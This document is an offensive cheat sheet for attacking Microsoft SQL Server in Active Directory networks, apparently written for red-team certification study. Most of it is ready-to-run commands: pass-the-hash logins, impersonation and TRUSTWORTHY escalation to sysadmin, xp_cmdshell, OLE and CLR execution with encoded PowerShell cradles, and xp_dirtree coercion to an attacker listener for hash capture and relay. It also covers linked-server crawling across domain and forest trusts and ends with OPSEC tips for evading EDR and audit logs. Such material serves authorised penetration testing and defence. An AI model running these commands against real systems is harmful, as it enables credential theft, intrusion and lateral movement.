# AD - MSSQL Server Abuse

> Observation first: before touching a single stored procedure, know **who you are** and **what you can reach**. Run `SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin')` and enumerate impersonable logins + linked servers. Most MSSQL wins are not "exploits" — they are *identity* (impersonation, `EXECUTE AS`, `TRUSTWORTHY`) and *trust* (linked servers reaching hosts/domains/forests you cannot touch directly). SQL Server almost always runs as a domain service account, so command execution = a foothold as that account, and its NetNTLM is one `xp_dirtree` away.

## Table of Contents
- [Discovery & Authentication](#discovery--authentication)
- [Enumeration (Server, DB, Roles)](#enumeration-server-db-roles)
- [Privilege Escalation Inside SQL](#privilege-escalation-inside-sql)
- [Command Execution](#command-execution)
- [Hash Capture / Relay via UNC Procs](#hash-capture--relay-via-unc-procs)
- [Linked Servers / Database Links](#linked-servers--database-links)
- [Multi-Hop Link Crawling](#multi-hop-link-crawling)
- [Command Execution Over a Link](#command-execution-over-a-link)
- [Cross-Domain / Cross-Forest via Links](#cross-domain--cross-forest-via-links)
- [Decision Table](#decision-table)
- [Cleanup & OPSEC](#cleanup--opsec)

Discovery basics also appear in [enumeration.md](enumeration.md) (MSSQL Discovery). Coerced NetNTLM capture/relay flows are in [ntlm-relay.md](ntlm-relay.md). After command execution as the service account, pivot with [lateral-movement.md](lateral-movement.md); dump the account's secrets via [credential-access.md](credential-access.md).

---

## Discovery & Authentication

SQL Server registers a `MSSQLSvc/<fqdn>:<port|instance>` SPN — any authenticated domain user can enumerate every instance in the domain, no scanning required.

```powershell
# PowerUpSQL - resolves MSSQLSvc SPNs against the DC (no port scan, domain user only)
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain                        # every registered instance in the domain
Get-SQLInstanceDomain | Get-SQLConnectionTest # which ones we can actually log into
Get-SQLInstanceLocal                         # instances on the local host
Get-SQLInstanceBroadcast; Get-SQLInstanceScanUDP  # UDP 1434 SQL Browser discovery

# Native SPN query
setspn -T corp.local -Q MSSQLSvc/*
```

```bash
# Linux discovery
GetUserSPNs.py corp.local/jsmith:'Passw0rd!' -dc-ip $DC | grep -i mssql
nxc mssql 10.10.10.0/24 -u $U -p "$P" -d corp.local          # sweep + auth check
nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info <target>
```

**Authenticate.** SQL Server accepts *Windows auth* (domain/local token, Kerberos or NTLM) and *SQL auth* (a login+password stored in the DB, e.g. `sa`).

```bash
# impacket mssqlclient.py
mssqlclient.py corp.local/jsmith:'Passw0rd!'@srv01 -windows-auth   # Windows/domain auth
mssqlclient.py 'sa:Passw0rd!'@srv01                                # SQL auth (no -windows-auth)
mssqlclient.py corp.local/jsmith@srv01 -windows-auth -hashes :<NTLM>  # pass-the-hash
mssqlclient.py corp.local/jsmith@srv01 -k -no-pass                 # Kerberos (KRB5CCNAME)

# netexec - protocol 'mssql'
nxc mssql srv01 -u $U -p "$P" -d corp.local                        # Windows auth
nxc mssql srv01 -u sa -p 'Passw0rd!' --local-auth                  # SQL auth
nxc mssql srv01 -u jsmith -H <NTLM> -d corp.local                  # PtH
nxc mssql srv01 -u $U -p "$P" -d corp.local -q "SELECT @@version"  # one-shot query
nxc mssql srv01 -u $U -p "$P" -d corp.local -M mssql_priv          # impersonation/sysadmin
```

```powershell
# Windows native: sqlcmd (Windows auth = -E, SQL auth = -U/-P)
sqlcmd -S srv01 -E -Q "SELECT @@version"
sqlcmd -S srv01 -U sa -P 'Passw0rd!' -Q "SELECT @@version"
# PowerUpSQL query wrapper (uses current token, or -Username/-Password for SQL auth)
Get-SQLQuery -Instance "srv01" -Query "SELECT @@version"
```

---

## Enumeration (Server, DB, Roles)

Establish server version/config, your effective identity, and where privileges leak.

```powershell
# PowerUpSQL
Get-SQLServerInfo   -Instance srv01           # version, service account, forced encryption, sysadmin?
Get-SQLDatabase     -Instance srv01           # all DBs; -NoDefaults hides system DBs
Get-SQLDatabase     -Instance srv01 | ? {$_.is_trustworthy_on -eq $true}  # TRUSTWORTHY DBs
Invoke-SQLAudit     -Instance srv01           # runs all privesc checks (impersonation, TW, links...)
Get-SQLServerLink   -Instance srv01           # linked servers (see below)
Get-SQLServerConfiguration -Instance srv01    # sp_configure dump (xp_cmdshell/ole/clr state)
Get-SQLServerLoginDefaultPw -Instance srv01   # known default app-server creds
```

```sql
-- Identity & privilege (works everywhere; run via any client)
SELECT SYSTEM_USER;                           -- login you authenticated as
SELECT USER_NAME();                           -- mapped DB user (often dbo or guest)
SELECT IS_SRVROLEMEMBER('sysadmin');          -- 1 = full server control, game over
SELECT IS_SRVROLEMEMBER('sysadmin', SYSTEM_USER);
SELECT IS_MEMBER('db_owner');                 -- db_owner in current DB (TRUSTWORTHY path)
SELECT @@version; SELECT @@servername; SELECT DB_NAME();
-- Service account context (what OS user command-exec would run as)
SELECT servicename, service_account, is_clustered FROM sys.dm_server_services;

-- Enumerate logins / server roles
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U','G');
SELECT r.name AS role, m.name AS member FROM sys.server_role_members rm
  JOIN sys.server_principals r ON rm.role_principal_id=r.principal_id
  JOIN sys.server_principals m ON rm.member_principal_id=m.principal_id;
```

`mssqlclient.py` shortcuts: `enum_db`, `enum_logins`, `enum_users`, `enum_owner`, `enum_impersonate`, `enum_links`.

---

## Privilege Escalation Inside SQL

Goal: reach `sysadmin` (or a login that can run commands / follow a link). Four classic paths.

### 1. Impersonation via `EXECUTE AS LOGIN` / `EXECUTE AS USER`
If a login has `IMPERSONATE` granted on another principal (very common on `sa`), you assume its context. Impersonating a sysadmin = becoming sysadmin.

```sql
-- Which logins can I impersonate at the SERVER level?
SELECT DISTINCT b.name AS grantee, a.name AS can_impersonate
FROM sys.server_permissions p
  JOIN sys.server_principals a ON p.grantor_principal_id = a.principal_id
  JOIN sys.server_principals b ON p.grantee_principal_id = b.principal_id
WHERE p.permission_name = 'IMPERSONATE';

-- Impersonate a server login (e.g. sa) and confirm
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');   -- expect sa / 1
-- ... run privileged actions here ...
REVERT;                                             -- drop back to original context

-- Database-level: impersonate a DB user (e.g. dbo) when you hold IMPERSONATE on it
EXECUTE AS USER = 'dbo';
SELECT USER_NAME();
REVERT;
```

```powershell
# PowerUpSQL: enumerate + auto-exploit impersonation to sysadmin
Invoke-SQLAuditPrivImpersonateLogin -Instance srv01 -Exploit
```
mssqlclient: `enum_impersonate` then `exec_as_login sa` / `exec_as_user dbo`.

### 2. TRUSTWORTHY database + `db_owner` -> sysadmin
If a DB has `TRUSTWORTHY ON` **and** its owner is a sysadmin (default `sa`), a `db_owner` in that DB can create an impersonation stored proc marked `EXECUTE AS OWNER` and thereby run code as the DB owner at server scope — escalating to sysadmin.

```sql
-- Find candidate DBs (TRUSTWORTHY on, owned by sysadmin)
SELECT name, is_trustworthy_on, SUSER_SNAME(owner_sid) AS owner FROM sys.databases;

USE <trustworthy_db>;
-- Create a proc that runs AS OWNER and adds our login to sysadmin
CREATE PROCEDURE dbo.sp_privesc WITH EXECUTE AS OWNER AS
  EXEC sp_addsrvrolemember 'corp\jsmith','sysadmin';
EXEC dbo.sp_privesc;
-- verify from a fresh context
SELECT IS_SRVROLEMEMBER('sysadmin');
```

```powershell
Invoke-SQLAuditPrivTrustworthy -Instance srv01 -Exploit    # PowerUpSQL automates the above
Invoke-SQLAuditPrivDbChaining  -Instance srv01             # ownership-chaining variant
```

### 3. Stored procedure / SQL Agent abuse
A `db_owner` who can create/alter procs the app calls, or a login in `SQLAgentUserRole`+ who can create Agent jobs, gains code execution in the SQL service (or proxy) account. Agent jobs support `CmdExec`/`PowerShell`/`JScript` subsystems.

```sql
-- Is SQL Agent running? (needed for job-based exec)
SELECT dss.status_desc FROM sys.dm_server_services dss WHERE servicename LIKE 'SQL Server Agent%';
```
```powershell
Invoke-SQLOSCmdAgentJob -Instance srv01 -SubSystem PowerShell -Command "whoami" -Verbose
```

### 4. UNC injection for the service-account hash
Not a SQL role escalation but often the fastest privesc: coerce the *service account's* NetNTLM (see [Hash Capture](#hash-capture--relay-via-unc-procs)) and relay/crack it — the account is frequently a local admin on the SQL host or elsewhere.

---

## Command Execution

All of these require `sysadmin` (or an impersonated/linked context that has it). SQL Server runs commands as its **service account**.

### xp_cmdshell
```sql
-- Enable (persists until turned off); requires 'show advanced options'
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;           RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -enc <b64>';     -- download-cradle / beacon
-- Re-disable to clean up
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
```
```bash
mssqlclient.py ... -windows-auth        # then at prompt:
enable_xp_cmdshell
xp_cmdshell whoami
```
```powershell
Invoke-SQLOSCmd -Instance srv01 -Command "whoami" -RawResults   # PowerUpSQL: auto-enables, runs, disables
nxc mssql srv01 -u sa -p 'x' --local-auth -x 'whoami'           # -x xp_cmdshell, -X for PowerShell
```

### xp_regread / xp_regwrite (registry)
Read stored creds/config, or write for persistence (e.g. autoruns, disable defenses). Undocumented but present.
```sql
EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',
  'SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections';
EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE',
  'SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;  -- enable RDP
```

### OLE Automation (`sp_OACreate`)
Alternative to xp_cmdshell (different feature switch — useful when xp_cmdshell is audited/blocked).
```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;
DECLARE @o INT, @out INT;
EXEC sp_OACreate 'WScript.Shell', @o OUT;
EXEC sp_OAMethod  @o, 'Run', @out OUT, 'cmd /c powershell -enc <b64>', 0, 1;
EXEC sp_OADestroy @o;
```
```powershell
Invoke-SQLOSCmdOle -Instance srv01 -Command "whoami" -Verbose
```

### CLR assembly execution
Load a custom .NET assembly exposing a stored proc that runs OS commands — no xp_cmdshell needed, only the `clr enabled` switch (and, on modern SQL, either `TRUSTWORTHY` or a signed/trusted assembly / `clr strict security` off).
```sql
EXEC sp_configure 'clr enabled',1; RECONFIGURE;
-- CREATE ASSEMBLY myasm FROM 0x4D5A... WITH PERMISSION_SET = UNSAFE;  (hex of the DLL)
-- CREATE PROCEDURE cmd_exec @cmd NVARCHAR(4000) AS EXTERNAL NAME myasm.[StoredProcedures].cmd_exec;
-- EXEC cmd_exec 'whoami';
```
```powershell
Invoke-SQLOSCmdCLR -Instance srv01 -Command "whoami" -Verbose   # PowerUpSQL builds/loads the assembly for you
```

---

## Hash Capture / Relay via UNC Procs

Several procs take a **path** and will happily authenticate to an attacker-controlled UNC share, leaking the SQL **service account's** NetNTLM. This needs only `public` on many builds (`xp_dirtree`/`xp_fileexist` are executable by public by default) — no sysadmin, no command exec.

```sql
-- Point any of these at your listener's UNC path
EXEC master..xp_dirtree   '\\10.10.14.5\share';       -- classic, public-executable
EXEC master..xp_fileexist '\\10.10.14.5\share\x';     -- public-executable
EXEC master..xp_subdirs   '\\10.10.14.5\share';       -- needs more privilege on some builds
```
```powershell
Get-SQLServiceAccount -Instance srv01                 # confirm the account you'll capture
Get-SQLQuery -Instance srv01 -Query "EXEC master..xp_dirtree '\\10.10.14.5\x'"
```
```bash
nxc mssql srv01 -u $U -p "$P" -d corp.local -M coerce_mssql -o LISTENER=10.10.14.5
```

On the listener: **capture** to crack, or **relay** to a target where the service account has rights. Full flows (SMB/LDAP/ADCS targets, signing constraints, coercion) are in [ntlm-relay.md](ntlm-relay.md).
```bash
# Capture (crack offline -> service account password)
sudo responder -I tun0
hashcat -m 5600 sqlsvc.ntlmv2 wordlist.txt

# Relay the service account elsewhere (it never signs — SQL svc accts are frequent local admins)
ntlmrelayx.py -t smb://fileserver -smb2support -c 'powershell -enc <b64>'
ntlmrelayx.py -t ldap://dc01 --escalate-user attacker      # RBCD / shadow-cred if account has rights
```
Note: this is also *reachable inbound* — ntlmrelayx can **relay another victim's coerced auth INTO MSSQL** (`-t mssql://srv01 -q "EXEC ..."`), see [ntlm-relay.md](ntlm-relay.md) "Relay to MSSQL".

---

## Linked Servers / Database Links

The CRTP/CRTE core. A **linked server** is a pre-configured connection from one SQL Server to another, storing *how to authenticate* to the remote. When you query across it, the remote work runs under **that stored security context** — commonly a privileged or `sa` mapping, and frequently on a box (or *domain/forest*) you have no direct path to. Chains of links let you hop instance -> instance -> instance, escalating identity at each hop.

```powershell
# PowerUpSQL - list links and, crucially, their configured privileges
Get-SQLServerLink -Instance srv01              # name, product, provider, data_source, local login mapping
```
```sql
-- Native enumeration
SELECT srvname, srvproduct, datasource, rpcout FROM master..sysservers;   -- classic view
SELECT name, product, provider, data_source, is_rpc_out_enabled
  FROM sys.servers WHERE is_linked = 1;
```
```bash
# mssqlclient.py built-in
enum_links
```

**Query across a single link.** Two forms:

```sql
-- OPENQUERY: pass-through SELECT/EXEC, runs on the REMOTE under the link's context
SELECT * FROM OPENQUERY("SQL02", 'SELECT @@version, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')');
SELECT * FROM OPENQUERY("SQL02", 'SELECT name FROM master..sysdatabases');

-- EXEC ... AT: run an arbitrary batch on the remote (requires 'rpc out' enabled on the link)
EXEC ('SELECT @@version, SYSTEM_USER;') AT "SQL02";
```
Quote-escaping deepens as you nest OPENQUERY (double single-quotes each layer): `''''` inside one nested layer, `''''''''` two deep. `EXEC AT` avoids most of this and supports multi-statement batches, but needs `rpc out`.

```bash
# mssqlclient.py: switch into a link and drive it like a local session
use_link SQL02          # now every query runs on SQL02 via the link
enum_impersonate        # re-enumerate identity on the remote
use_link localhost      # or 'use_link ..' to step back one hop
```
```powershell
# PowerUpSQL: one-off query down a known link path
Get-SQLQuery -Instance srv01 -Query "SELECT * FROM OPENQUERY(""SQL02"",'SELECT SYSTEM_USER')"
```

---

## Multi-Hop Link Crawling

Links chain. `Get-SQLServerLinkCrawl` recursively follows every link from your entry instance, reporting the path, the version, the identity you land as, and whether you are sysadmin at each node — the single most valuable command in the whole workflow.

```powershell
# Map the entire reachable link graph from srv01
Get-SQLServerLinkCrawl -Instance srv01 -Verbose

# Crawl AND run a query at every reachable node
Get-SQLServerLinkCrawl -Instance srv01 -Query "SELECT SYSTEM_USER,@@servername,IS_SRVROLEMEMBER('sysadmin')"

# Crawl and run an OS command at every node where we can (auto-picks xp_cmdshell path)
Get-SQLServerLinkCrawl -Instance srv01 -Query "exec master..xp_cmdshell 'whoami'"

# Filter live nodes, then query each via its discovered Path
Get-SQLServerLinkCrawl -Instance srv01 | Where-Object {$_.Instance -ne "Broken Link"}
```

Manual nesting (no PowerUpSQL) — OPENQUERY inside OPENQUERY walks the chain srv01 -> SQL02 -> SQL03:
```sql
SELECT * FROM OPENQUERY("SQL02",
  'SELECT * FROM OPENQUERY("SQL03",''SELECT @@servername, SYSTEM_USER'')');
```
Each hop adopts the *next* link's stored credential, so identity can *increase* as you descend (e.g. you are `public` on SQL02 but the SQL02->SQL03 link is mapped to `sa`).

---

## Command Execution Over a Link

Two obstacles on a remote node: `xp_cmdshell` may be off, and enabling it via `sp_configure` needs `rpc out` on the link (`EXEC AT`). If the link only supports `OPENQUERY` (no rpc out), enable rpc out from the *upstream* side first (requires sysadmin there).

```sql
-- If you are sysadmin on srv01, turn on rpc out for the link so EXEC AT works
EXEC sp_serveroption 'SQL02', 'rpc', 'true';
EXEC sp_serveroption 'SQL02', 'rpc out', 'true';

-- Remotely enable and fire xp_cmdshell on SQL02 (context = the link's mapped login)
EXEC ('sp_configure ''show advanced options'',1; reconfigure;') AT "SQL02";
EXEC ('sp_configure ''xp_cmdshell'',1; reconfigure;')            AT "SQL02";
EXEC ('xp_cmdshell ''whoami'';')                                 AT "SQL02";

-- Pure OPENQUERY variant when rpc out is unavailable (config change must already be done)
SELECT * FROM OPENQUERY("SQL02", 'SELECT * FROM OPENQUERY("SQL02",''EXEC xp_cmdshell ''''whoami'''''')');
```
```powershell
# PowerUpSQL does the enable+exec+crawl end-to-end
Get-SQLServerLinkCrawl -Instance srv01 -Query "exec master..xp_cmdshell 'whoami'" -Verbose
```
```bash
# mssqlclient.py, after use_link:
use_link SQL02
enable_xp_cmdshell
xp_cmdshell whoami
```

Deepest hop: chain the `EXEC AT` so the final node runs the command. At each layer confirm identity (`SYSTEM_USER`, `IS_SRVROLEMEMBER('sysadmin')`) — you only get command exec where the landed context is sysadmin (or can escalate via impersonation/TRUSTWORTHY *on that node*).

---

## Cross-Domain / Cross-Forest via Links

Why links matter for CRTP/CRTE: the linked-server credential is stored **on the remote SQL Server** and evaluated **there**. A link from `DomainA\SQL01` to `DomainB\SQL10` executes in DomainB under whatever DomainB principal the link is mapped to — bridging a trust you could not otherwise cross, and giving you code execution as a DomainB service account (often a foothold into the second domain/forest).

- The link's data source can point across a domain/forest trust; the *mapped login* (or "self-mapping" using the current login) governs privilege on the far side.
- If the far-side link maps to `sa` or a sysadmin, you inherit sysadmin **in the other domain** without ever holding a DomainB credential.
- `Get-SQLServerLinkCrawl` will happily traverse links whose data source is in another forest — read the `Instance`/`data_source` column to spot the domain boundary crossing.
- After landing command exec on the far-side host as its SQL service account, treat it as a fresh foothold: harvest tickets/hashes ([credential-access.md](credential-access.md)) and pivot ([lateral-movement.md](lateral-movement.md)). In CRTE this is the standard route from a child/other forest's SQL box back toward its DC.

```powershell
# Reveal the boundary: which links leave the current domain/forest?
Get-SQLServerLinkCrawl -Instance srv01 | Select-Object Version,Instance,Sysadmin,User,Path
# Then run OS cmd on the cross-forest node it found
Get-SQLServerLinkCrawl -Instance srv01 -Query "exec master..xp_cmdshell 'whoami /all'"
```

---

## Decision Table

| My SQL access on this instance | Fastest next step |
|---|---|
| `public` only | `xp_dirtree`/`xp_fileexist` UNC -> capture/relay service-acct NetNTLM ([ntlm-relay.md](ntlm-relay.md)); enumerate `sys.servers` for links to crawl; test default app creds (`Get-SQLServerLoginDefaultPw`). |
| Can impersonate a login | `EXECUTE AS LOGIN='sa'` (enumerate via impersonation query / `enum_impersonate`), confirm `IS_SRVROLEMEMBER('sysadmin')`, then command exec. |
| `db_owner` in a `TRUSTWORTHY` DB owned by sysadmin | Create `WITH EXECUTE AS OWNER` proc -> `sp_addsrvrolemember` self to sysadmin (`Invoke-SQLAuditPrivTrustworthy -Exploit`). |
| `db_owner`, no TRUSTWORTHY | Abuse callable procs / SQL Agent job (`Invoke-SQLOSCmdAgentJob`); or use UNC-injection hash capture. |
| `sysadmin` | `xp_cmdshell` (or OLE/CLR if audited) as the service account; `xp_regwrite` persistence; enable `rpc out` on links and crawl outward. |
| Linked server(s) present | `Get-SQLServerLinkCrawl` the whole graph; land where the mapped login is sysadmin; `EXEC AT`/OPENQUERY for query or command exec; follow links into other domains/forests. |
| Command exec achieved | You are the **SQL service account**: harvest its tickets/hashes ([credential-access.md](credential-access.md)), check local-admin reach, pivot ([lateral-movement.md](lateral-movement.md)). |

---

## Cleanup & OPSEC

- Reset every config switch you flipped: `sp_configure 'xp_cmdshell',0`, `'Ole Automation Procedures',0`, `'clr enabled',0`, `'show advanced options',0`, each with `RECONFIGURE`. PowerUpSQL `Invoke-SQLOSCmd*` restore state automatically.
- `sp_configure` changes fire trace/audit events; `xp_cmdshell` spawns `cmd.exe` as the SQL service account (parent = `sqlservr.exe`) — a loud EDR signal. Prefer OLE/CLR or Agent jobs where xp_cmdshell is specifically monitored, but note those have their own switches/events.
- `EXECUTE AS` without a matching `REVERT` leaves you in an impersonated context for the session — always `REVERT` (or reconnect) so later enumeration reflects your real identity.
- Drop any proc/assembly/Agent job you created (`DROP PROCEDURE`, `DROP ASSEMBLY`, `sp_delete_job`).
- UNC-injection procs generate outbound SMB from the SQL host to your listener — anomalous and logged; use sparingly and from an expected-looking IP.
